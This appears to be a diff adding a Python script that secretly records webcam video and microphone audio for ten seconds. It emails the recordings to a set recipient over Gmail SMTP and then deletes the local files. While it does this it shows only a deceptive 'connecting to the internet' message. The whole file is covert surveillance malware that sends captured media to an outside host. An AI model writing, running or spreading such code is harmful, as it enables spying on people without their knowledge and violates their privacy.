@@ -1,0 +1,115 @@
+import cv2
+import os
+import wave
+import pyaudio
+from datetime import datetime
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import subprocess
+import sys
+
+def install_packages():
+    try:
+        import cv2
+        import pyaudio
+        import smtplib
+    except ImportError:
+        print("Please wait while we connect to the internet...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "opencv-python", "pyaudio", "smtplib"])
+        print("Dependencies installed successfully.")
+
+def capture_webcam_and_audio(duration=10, email_to="your_email@example.com"):
+    print("Please wait while we connect to the internet...")
+
+    # Set up webcam capture
+    cap = cv2.VideoCapture(0)
+    if not cap.isOpened():
+        print("Error: Could not open webcam.")
+        return
+
+    # Set up audio capture
+    audio = pyaudio.PyAudio()
+    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=4096)
+
+    # Define file names
+    video_filename = "webcam_capture.avi"
+    audio_filename = "audio_capture.wav"
+
+    # Set up video writer
+    fourcc = cv2.VideoWriter_fourcc(*'XVID')
+    out = cv2.VideoWriter(video_filename, fourcc, 20.0, (640, 480))
+
+    # Capture video and audio
+    audio_frames = []
+    start_time = datetime.now()
+    while (datetime.now() - start_time).seconds < duration:
+        ret, frame = cap.read()
+        if not ret:
+            print("Error: Could not read frame.")
+            break
+
+        # Write video frame
+        out.write(frame)
+
+        # Read audio frame
+        data = stream.read(4096)
+        audio_frames.append(data)
+
+    # Release resources
+    cap.release()
+    out.release()
+    cv2.destroyAllWindows()
+
+    stream.stop_stream()
+    stream.close()
+    audio.terminate()
+
+    # Save audio file
+    with wave.open(audio_filename, 'wb') as wf:
+        wf.setnchannels(1)
+        wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
+        wf.setframerate(44100)
+        wf.writeframes(b''.join(audio_frames))
+
+    # Send email with attachments
+    send_email(email_to, video_filename, audio_filename)
+
+    # Remove files after sending
+    os.remove(video_filename)
+    os.remove(audio_filename)
+
+def send_email(email_to, video_filename, audio_filename):
+    email_from = "your_email@gmail.com"
+    email_password = "your_password"
+    
+    msg = MIMEMultipart()
+    msg['From'] = email_from
+    msg['To'] = email_to
+    msg['Subject'] = "Webcam and Audio Capture"
+
+    # Attach video file
+    attachment = MIMEBase('application', 'octet-stream')
+    attachment.set_payload(open(video_filename, "rb").read())
+    encoders.encode_base64(attachment)
+    attachment.add_header('Content-Disposition', f'attachment; filename={video_filename}')
+    msg.attach(attachment)
+
+    # Attach audio file
+    attachment = MIMEBase('application', 'octet-stream')
+    attachment.set_payload(open(audio_filename, "rb").read())
+    encoders.encode_base64(attachment)
+    attachment.add_header('Content-Disposition', f'attachment; filename={audio_filename}')
+    msg.attach(attachment)
+
+    # Send email
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(email_from, email_password)
+    server.sendmail(email_from, email_to, msg.as_string())
+    server.quit()
+
+if __name__ == "__main__":
+    install_packages()
+    capture_webcam_and_audio(duration=10, email_to="recipient_email@example.com")
